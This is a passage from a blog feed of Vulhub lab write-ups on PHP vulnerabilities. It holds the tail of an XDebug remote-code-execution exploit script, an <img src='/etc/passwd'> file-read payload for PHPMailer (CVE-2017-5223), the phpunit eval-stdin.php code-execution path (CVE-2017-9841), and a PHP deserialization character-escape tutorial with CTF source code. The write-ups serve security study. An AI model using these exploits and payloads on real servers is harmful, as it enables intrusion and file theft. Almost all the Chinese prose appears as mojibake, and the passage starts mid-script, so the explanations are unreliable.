class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(args.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">    g = re.search(r<span class="string">b&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">        print(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    data = g.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        print(<span class="string">&#x27;[-] May be not string result...&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong>å› ä¸ºè¯¥é€šä¿¡æ˜¯ä¸€ä¸ªåå‘è¿æ¥çš„è¿‡ç¨‹ï¼Œexp.pyå¯åŠ¨åå…¶å®æ˜¯ä¼šç›‘å¬æœ¬åœ°çš„9000ç«¯å£ï¼ˆå¯é€šè¿‡-lå‚æ•°æŒ‡å®šï¼‰å¹¶ç­‰å¾…XDebugå‰æ¥è¿æ¥ï¼Œæ‰€ä»¥æ‰§è¡Œè¯¥è„šæœ¬çš„æœåŠ¡å™¨å¿…é¡»æœ‰å¤–ç½‘IPï¼ˆæˆ–è€…ä¸ç›®æ ‡æœåŠ¡å™¨å¤„äºåŒä¸€å†…ç½‘ï¼‰</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200506140437.png" style="zoom:80%;"><h2 id="CVE-2017-5223"><a href="#CVE-2017-5223" class="headerlink" title="CVE-2017-5223"></a>CVE-2017-5223</h2><h3 id="æ¼æ´ç®€ä»‹-6"><a href="#æ¼æ´ç®€ä»‹-6" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´å¯å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>PHPMaileræ˜¯å ªç§°å…¨çƒæœ€æµè¡Œé‚®ä»¶å‘é€ç±»ï¼Œå…¶å…¨çƒèŒƒå›´å†…çš„ç”¨æˆ·é‡å¤§çº¦æœ‰900ä¸‡ï¼Œè¢«è¯¸å¤šå¼€æºé¡¹ç›®æ‰€é‡‡ç”¨ï¼ŒåŒ…æ‹¬WordPressã€Drupalã€1CRMã€Joomla!ç­‰</p><p>PHPMaileråœ¨å‘é€é‚®ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œä¼šåœ¨é‚®ä»¶å†…å®¹ä¸­å¯»æ‰¾å›¾ç‰‡æ ‡ç­¾ï¼ˆ<code>&lt;img src=&quot;...&quot;&gt;</code>ï¼‰ï¼Œå¹¶å°†å…¶srcå±æ€§çš„å€¼æå–å‡ºæ¥ä½œä¸ºé™„ä»¶ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶éƒ¨åˆ†é‚®ä»¶å†…å®¹ï¼Œå¯ä»¥åˆ©ç”¨<code>&lt;img src=&quot;/etc/passwd&quot;&gt;</code>å°†æ–‡ä»¶<code>/etc/passwd</code>ä½œä¸ºé™„ä»¶è¯»å–å‡ºæ¥ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚</p><h3 id="æ¼æ´å¤ç°-6"><a href="#æ¼æ´å¤ç°-6" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æ­å»ºå¥½ç¯å¢ƒæˆ‘ä»¬çœ‹ä¸‹æºç ï¼š</p><p><strong>index.php:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &#39;vendor&#x2F;autoload.php&#39;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;your-name&#39;], $_POST[&#39;your-email&#39;], $_POST[&#39;your-message&#39;])) &#123;</span><br><span class="line">    $mail &#x3D; new PHPMailer();</span><br><span class="line">    $mail-&gt;isSMTP();</span><br><span class="line">    $mail-&gt;Host &#x3D; $_ENV[&#39;SMTP_SERVER&#39;];</span><br><span class="line">    $mail-&gt;SMTPAuth &#x3D; true;</span><br><span class="line">    $mail-&gt;Username &#x3D; $_ENV[&#39;SMTP_EMAIL&#39;];</span><br><span class="line">    $mail-&gt;Password &#x3D; $_ENV[&#39;SMTP_PASSWORD&#39;];</span><br><span class="line">    $mail-&gt;Port &#x3D; intval($_ENV[&#39;SMTP_PORT&#39;]);</span><br><span class="line">    $mail-&gt;CharSet &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">    if (in_array($_ENV[&#39;SMTP_SECURE&#39;], [&#39;tls&#39;, &#39;ssl&#39;])) &#123;</span><br><span class="line">        $mail-&gt;SMTPSecure &#x3D; $_ENV[&#39;SMTP_SECURE&#39;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $mail-&gt;SMTPSecure &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $message &#x3D; &lt;&lt;&lt;DATA</span><br><span class="line">&lt;p&gt;&lt;strong&gt;&#123;$_POST[&#39;your-name&#39;]&#125;&lt;&#x2F;strong&gt;æ‚¨å¥½ï¼Œæ‚¨åé¦ˆçš„æ„è§å¦‚ä¸‹ï¼š&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;blackquote&gt;&#123;$_POST[&#39;your-message&#39;]&#125;&lt;&#x2F;blockquote&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;æˆ‘ä»¬å°†åœ¨24å°æ—¶å†…ç»™äºˆæ‚¨å›å¤ï¼Œè¯·è€å¿ƒç­‰å¾…ï¼&lt;&#x2F;p&gt;</span><br><span class="line">DATA;</span><br><span class="line">    $mail-&gt;SetFrom($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]);</span><br><span class="line">    $mail-&gt;AddAddress($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]);</span><br><span class="line">    $mail-&gt;Subject &#x3D; &quot;æ‚¨åé¦ˆçš„æ„è§æˆ‘ä»¬å·²ç»æ”¶åˆ°&quot;;</span><br><span class="line">    $mail-&gt;MsgHTML($message);</span><br><span class="line">    if(!$mail-&gt;Send()) echo &quot;Error: &quot;.$mail-&gt;ErrorInfo; else echo &quot;Success!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHPMailerç±»åœ¨<code>vendor/phpmailer/phpmailer</code>ä¸‹é¢</p><p>ç”±äºè‡ªå·±çš„æ˜¯é˜¿é‡Œäº‘ï¼Œå¥½åƒæ­ä¸äº†é‚®ä»¶æœåŠ¡å™¨ï¼Œä¹Ÿæ²¡å¤ç°æˆåŠŸ2333â€¦</p><p>æ­å»ºå¥½çš„ç¯å¢ƒå¦‚å›¾ï¼š</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200506210641.png" style="zoom:67%;"><p>â€œæ„è§åé¦ˆâ€é¡µé¢ï¼Œæ­£å¸¸ç”¨æˆ·å¡«å†™æ˜µç§°ã€é‚®ç®±ã€æ„è§æäº¤ï¼Œè¿™äº›ä¿¡æ¯å°†è¢«åç«¯å‚¨å­˜ï¼ŒåŒæ—¶åç«¯ä¼šå‘é€ä¸€å°é‚®ä»¶æç¤ºç”¨æˆ·æ„è§å¡«å†™å®Œæˆã€‚è¯¥åœºæ™¯åœ¨å®æˆ˜ä¸­å¾ˆå¸¸è§ï¼Œæ¯”å¦‚ç”¨æˆ·æ³¨å†Œç½‘ç«™æˆåŠŸåï¼Œé€šå¸¸ä¼šæ”¶åˆ°ä¸€å°åŒ…å«è‡ªå·±æ˜µç§°çš„é€šçŸ¥é‚®ä»¶ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬åœ¨æ˜µç§°ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å°†ä»¥é™„ä»¶çš„å½¢å¼è¢«è¯»å–å‡ºæ¥ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2017-9841"><a href="#CVE-2017-9841" class="headerlink" title="CVE-2017-9841"></a>CVE-2017-9841</h2><h3 id="æ¼æ´ç®€ä»‹-7"><a href="#æ¼æ´ç®€ä»‹-7" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´å¯å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><p>composeræ˜¯phpåŒ…ç®¡ç†å·¥å…·ï¼Œä½¿ç”¨composerå®‰è£…æ‰©å±•åŒ…å°†ä¼šåœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ªvendoræ–‡ä»¶å¤¹ï¼Œå¹¶å°†æ‰€æœ‰æ–‡ä»¶æ”¾åœ¨å…¶ä¸­ã€‚é€šå¸¸è¿™ä¸ªç›®å½•éœ€è¦æ”¾åœ¨webç›®å½•å¤–ï¼Œä½¿ç”¨æˆ·ä¸èƒ½ç›´æ¥è®¿é—®ã€‚</p><p>phpunitæ˜¯phpä¸­çš„å•å…ƒæµ‹è¯•å·¥å…·ï¼Œå…¶4.8.19 ~ 4.8.27å’Œ5.0.10 ~ 5.6.2ç‰ˆæœ¬çš„<code>vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code>æ–‡ä»¶æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.file_get_contents(<span class="string">&#x27;php://input&#x27;</span>));</span><br></pre></td></tr></table></figure><p>å¦‚æœè¯¥æ–‡ä»¶è¢«ç”¨æˆ·ç›´æ¥è®¿é—®åˆ°ï¼Œå°†é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="æ¼æ´å¤ç°-7"><a href="#æ¼æ´å¤ç°-7" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ç›´æ¥å°†PHPä»£ç ä½œä¸ºPOST Bodyå‘é€ç»™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//yourip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></span><br></pre></td></tr></table></figure><p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulhub </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</title>
      <link href="2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
      <url>2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Ÿ</h2><p>ä¸ªäººç†è§£ï¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œå­˜åœ¨å¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ›¿æ¢ç­‰æ“ä½œï¼Œå¯¼è‡´å¯ä»¥æ„é€ ç‰¹å®šçš„å­—ç¬¦ä¸²åºåˆ—è¾¾åˆ°æœ¬æ¥å®Œæˆä¸äº†çš„æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹å…¶ä»–å˜é‡çš„å€¼ï¼Œæ³¨å…¥å¯¹è±¡ã€‚</p><p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$password = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">$s = serialize($user);</span><br><span class="line">$r = filter($s);</span><br><span class="line">$a= unserialize($r);</span><br><span class="line"><span class="keyword">if</span>($a[<span class="number">1</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>æœ‰ä¸Šé¢ä¸€æ®µä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯æ§çš„åœ°æ–¹åªæœ‰<code>$username</code>ï¼Œåé¢æœ‰ä¸€ä¸ªfilterå‡½æ•°æ›¿æ¢</p><p>æˆ‘ä»¬çŸ¥é“ï¼ŒPHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</p><p>æ­£å¸¸çš„åºåˆ—åŒ–ç»“æœæ˜¯è¿™æ ·çš„(å‡è®¾u=admin):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ˜¯æ²¡æœ‰xçš„ï¼Œå‡è®¾æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå¸¦å­—æ¯xçš„(u=testx)ï¼Œåºåˆ—åŒ–ç»è¿‡æ›¿æ¢å°±ä¼šå˜æˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;testyy&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ååºåˆ—åŒ–ï¼Œå°±ä¼šå¤±è´¥ï¼Œ<code>testyy</code>çš„é•¿åº¦ä¸æ˜¯5è€Œæ˜¯6ï¼Œunserializeå‡½æ•°è¿”å›<code>false</code></p><p>ä½†æ˜¯ï¼Œå‡å¦‚æˆ‘ä»¬ä¼ å…¥ï¼Œé•¿åº¦ä¸º38</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?u=xxxxxxxxxxxxxxxxxxx<span class="string">&quot;;i:1;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åºåˆ—åŒ–ç»“æœæ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">38</span>:<span class="string">&quot;xxxxxxxxxxxxxxxxxxx&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;i:1;s:3:&quot;</span>aaa<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡æ›¿æ¢ååºåˆ—åŒ–ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">38</span>:<span class="string">&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;i:1;s:3:&quot;</span>aaa<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶<code>yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy</code>çš„é•¿åº¦åˆšå¥½ä¸º38ï¼Œå†åŠ ä¸Šåé¢çš„<code>;i:1;s:5:&quot;admin&quot;;&#125;</code>æˆåŠŸååºåˆ—åŒ–ï¼Œè€Œè¿™åé¢çš„ç›´æ¥å¿½ç•¥äº†</p><p>é‚£æ€æ ·ç®—åˆ°åº•æœ‰å¤šå°‘ä¸ªxå‘¢ï¼Ÿæˆ‘ç”¨çš„æ–¹æ³•æ˜¯åˆ—æ–¹ç¨‹ğŸ˜‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦ç¡®å®šéœ€è¦æ·»åŠ çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯åé¢ä¸€ä¸²ï¼Œå³<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>ï¼Œé•¿åº¦ä¸º19(è®¾ä¸ºm)ï¼Œæ»¡è¶³ä»¥ä¸‹å¼å­(è®¾æœ‰nä¸ª<code>x</code>å­—ç¬¦ï¼Œ<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>å‰é¢æœ‰yä¸ªé<code>x</code>å­—ç¬¦)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n+y+m=<span class="number">2</span>n+y <span class="comment">// åŸæ¥å­—ç¬¦ä¸²çš„é•¿åº¦ = æ›¿æ¢åå»æ‰mçš„é•¿åº¦</span></span><br></pre></td></tr></table></figure><p>è§£æ–¹ç¨‹å¾—n=19ï¼Œå³æˆ‘ä»¬è¦æœ‰19ä¸ªxï¼Œyéšæ„ï¼Œä»ç­‰å¼å¯ä»¥çœ‹å‡ºæŠµæ¶ˆäº†</p><p>å¦‚æœç¢°åˆ°é™¤ä¸å°½çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>å‰é¢å¢åŠ ä¸€äº›é<code>x</code>å­—ç¬¦ï¼Œç±»ä¼¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&quot;;i:1;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶mçš„é•¿åº¦å¤§äº19</p><h2 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h2><h3 id="2020å®‰æ’å››æœˆæœˆèµ›"><a href="#2020å®‰æ’å››æœˆæœˆèµ›" class="headerlink" title="2020å®‰æ’å››æœˆæœˆèµ›"></a>2020å®‰æ’å››æœˆæœˆèµ›</h3><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $c = <span class="string">&#x27;a&#x27;</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//çœç•¥äº†å­˜å‚¨åºåˆ—åŒ–æ•°æ®çš„è¿‡ç¨‹,ä¸‹é¢æ˜¯å–å‡ºæ¥å¹¶ååºåˆ—åŒ–çš„æ“ä½œ</span></span><br><span class="line">$e = serialize($a);</span><br><span class="line">$c = write($e);</span><br><span class="line">$d = read($c);</span><br><span class="line">$b = unserialize($d); </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶GETå‚æ•°a,bçš„å€¼</p><p>åœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œåºåˆ—åŒ–å­—ç¬¦ä¸²ç»è¿‡äº†ä¸¤æ¬¡æ›¿æ¢ï¼ˆ<code>chr(0)</code>ç”¨<code>%00</code>æ›¿æ¢ï¼‰</p><p>ç¬¬ä¸€æ¬¡æ˜¯æŠŠ<code>%00*%00</code>æ›¿æ¢æˆäº†<code>\0\0\0</code>ï¼Œè¿™é‡Œé•¿åº¦å¢åŠ ï¼Œç”±3å˜æˆ6</p><p>ç¬¬äºŒæ¬¡æ˜¯æŠŠ<code>\0\0\0</code>æ›¿æ¢æˆäº†<code>%00*%00</code>ï¼Œè¿™é‡Œé•¿åº¦å‡å°‘ï¼Œç”±6å˜æˆ3</p><p>å…ˆçœ‹ä¸‹æ­£å¸¸åºåˆ—åŒ–çš„ç»“æœ(a=admin,b=admin):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœæ˜¯åµŒå¥—çš„ç±»ï¼ˆç±»é‡Œé¢çš„å‚æ•°è¿˜æ˜¯ä¸ªç±»ï¼‰ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥æŠŠè¯»flag.phpçš„é“¾æ„é€ å‡ºæ¥äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="comment">// function 